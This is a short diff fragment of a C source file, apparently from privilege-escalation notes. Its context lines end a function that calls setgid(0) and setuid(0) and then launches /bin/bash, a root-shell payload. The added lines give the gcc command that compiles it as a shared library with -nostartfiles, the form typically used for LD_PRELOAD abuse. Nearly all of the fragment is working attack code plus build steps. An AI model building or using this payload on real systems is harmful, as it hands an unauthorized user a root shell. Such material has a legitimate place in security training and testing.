@@ -8,3 +8,9 @@ setgid(0);
 setuid(0);
 system("/bin/bash");
 }
+
+
+
+USE THIS COMNMAND:
+gcc -fPIC -shared -o <filename>.so <saved-file-name>.c -nostartfiles
+
